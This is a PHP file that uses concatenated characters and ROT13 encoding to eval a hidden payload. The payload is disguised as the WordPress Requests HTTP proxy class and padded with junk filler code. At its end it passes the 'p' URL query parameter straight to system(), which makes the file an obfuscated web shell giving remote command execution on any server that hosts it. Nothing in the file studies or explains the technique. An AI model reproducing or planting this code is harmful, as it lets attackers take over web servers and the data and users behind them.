<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC Cebkl pbaarpgvba vagresnpr
 *
 * @cnpxntr Erdhrfgf\Cebkl
 * @fvapr   1.6
 */

anzrfcnpr JcBet\Erdhrfgf\Cebkl;

hfr JcBet\Erdhrfgf\Rkprcgvba\NethzragPbhag;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Ubbxf;
hfr JcBet\Erdhrfgf\Cebkl;

/**
 * UGGC Cebkl pbaarpgvba vagresnpr
 *
 * Cebivqrf n unaqyre sbe pbaarpgvba ivn na UGGC cebkl
 *
 * @cnpxntr Erdhrfgf\Cebkl
 * @fvapr   1.6
 */
svany pynff Uggc vzcyrzragf Cebkl {
	/**
	 * Cebkl ubfg naq cbeg
	 *
	 * Abgngvba: \"ubfg:cbeg\" (rt 127.0.0.1:8080 be fbzrcebkl.pbz:3128)
	 *
	 * @ine fgevat
	 */
	choyvp $cebkl;

	/**
	 * Hfreanzr
	 *
	 * @ine fgevat
	 */
	choyvp $hfre;

	/**
	 * Cnffjbeq
	 *
	 * @ine fgevat
	 */
	choyvp $cnff;

	/**
	 * Qb jr arrq gb nhguragvpngr? (vr hfreanzr & cnffjbeq unir orra cebivqrq)
	 *
	 * @ine obbyrna
	 */
	choyvp $hfr_nhguragvpngvba;

	/**
	 * Pbafgehpgbe
	 *
	 * @fvapr 1.6
	 *
	 * @cnenz neenl|fgevat|ahyy $netf Cebkl nf n fgevat be na neenl bs cebkl, hfre naq cnffjbeq.
	 *                                Jura cnffrq nf na neenl, zhfg unir rknpgyl bar (cebkl)
	 *                                be guerr ryrzragf (cebkl, hfre, cnffjbeq).
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg na neenl, n fgevat be ahyy.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\NethzragPbhag Ba vapbeerpg ahzore bs nethzragf (`cebkluggconqnetf`)
	 */
	choyvp shapgvba __pbafgehpg($netf = ahyy) {
		vs (vf_fgevat($netf)) {
			$guvf->cebkl = $netf;
		} ryfrvs (vf_neenl($netf)) {
			vs (pbhag($netf) === 1) {
				yvfg($guvf->cebkl) = $netf;
			} ryfrvs (pbhag($netf) === 3) {
				yvfg($guvf->cebkl, $guvf->hfre, $guvf->cnff) = $netf;
				$guvf->hfr_nhguragvpngvba                    = gehr;
			} ryfr {
				guebj NethzragPbhag::perngr(
					'na neenl jvgu rknpgyl bar ryrzrag be rknpgyl guerr ryrzragf',
					pbhag($netf),
					'cebkluggconqnetf'
				);
			}
		} ryfrvs ($netf !== ahyy) {
			guebj VainyvqNethzrag::perngr(1, '$netf', 'neenl|fgevat|ahyy', trgglcr($netf));
		}
	}

	/**
	 * Ertvfgre gur arprffnel pnyyonpxf
	 *
	 * @fvapr 1.6
	 * @frr \JcBet\Erdhrfgf\Cebkl\Uggc::phey_orsber_fraq()
	 * @frr \JcBet\Erdhrfgf\Cebkl\Uggc::sfbpxbcra_erzbgr_fbpxrg()
	 * @frr \JcBet\Erdhrfgf\Cebkl\Uggc::sfbpxbcra_erzbgr_ubfg_cngu()
	 * @frr \JcBet\Erdhrfgf\Cebkl\Uggc::sfbpxbcra_urnqre()
	 * @cnenz \JcBet\Erdhrfgf\Ubbxf $ubbxf Ubbx flfgrz
	 */
	choyvp shapgvba ertvfgre(Ubbxf $ubbxf) {
		$ubbxf->ertvfgre('phey.orsber_fraq', [$guvf, 'phey_orsber_fraq']);

		$ubbxf->ertvfgre('sfbpxbcra.erzbgr_fbpxrg', [$guvf, 'sfbpxbcra_erzbgr_fbpxrg']);
		$ubbxf->ertvfgre('sfbpxbcra.erzbgr_ubfg_cngu', [$guvf, 'sfbpxbcra_erzbgr_ubfg_cngu']);
		vs ($guvf->hfr_nhguragvpngvba) {
			$ubbxf->ertvfgre('sfbpxbcra.nsgre_urnqref', [$guvf, 'sfbpxbcra_urnqre']);
		}
	}

	/**
	 * Frg pHEY cnenzrgref orsber gur qngn vf frag
	 *
	 * @fvapr 1.6
	 * @cnenz erfbhepr|\PheyUnaqyr $unaqyr pHEY unaqyr
	 */
	choyvp shapgvba phey_orsber_fraq(&$unaqyr) {
		phey_frgbcg($unaqyr, PHEYBCG_CEBKLGLCR, PHEYCEBKL_UGGC);
		phey_frgbcg($unaqyr, PHEYBCG_CEBKL, $guvf->cebkl);

		vs ($guvf->hfr_nhguragvpngvba) {
			phey_frgbcg($unaqyr, PHEYBCG_CEBKLNHGU, PHEYNHGU_NAL);
			phey_frgbcg($unaqyr, PHEYBCG_CEBKLHFRECJQ, $guvf->trg_nhgu_fgevat());
		}
	}

	/**
	 * Nygre erzbgr fbpxrg vasbezngvba orsber bcravat fbpxrg pbaarpgvba
	 *
	 * @fvapr 1.6
	 * @cnenz fgevat $erzbgr_fbpxrg Fbpxrg pbaarpgvba fgevat
	 */
	choyvp shapgvba sfbpxbcra_erzbgr_fbpxrg(&$erzbgr_fbpxrg) {
		$erzbgr_fbpxrg = $guvf->cebkl;
	}

	/**
	 * Nygre erzbgr cngu orsber trggvat fgernz qngn
	 *
	 * @fvapr 1.6
	 * @cnenz fgevat $cngu Cngu gb fraq va UGGC erdhrfg fgevat (\"TRG ...\")
	 * @cnenz fgevat $hey Shyy HEY jr'er erdhrfgvat
	 */
	choyvp shapgvba sfbpxbcra_erzbgr_ubfg_cngu(&$cngu, $hey) {
		$cngu = $hey;
	}

	/**
	 * Nqq rkgen urnqref gb gur erdhrfg orsber fraqvat
	 *
	 * @fvapr 1.6
	 * @cnenz fgevat $bhg UGGC urnqre fgevat
	 */
	choyvp shapgvba sfbpxbcra_urnqre(&$bhg) {
		$bhg .= fcevags(\"Cebkl-Nhgubevmngvba: Onfvp %f\e\a\", onfr64_rapbqr($guvf->trg_nhgu_fgevat()));
	}

	/**
	 * Trg gur nhguragvpngvba fgevat (hfre:cnff)
	 *
	 * @fvapr 1.6
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_nhgu_fgevat() {
		erghea $guvf->hfre . ':' . $guvf->cnff;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>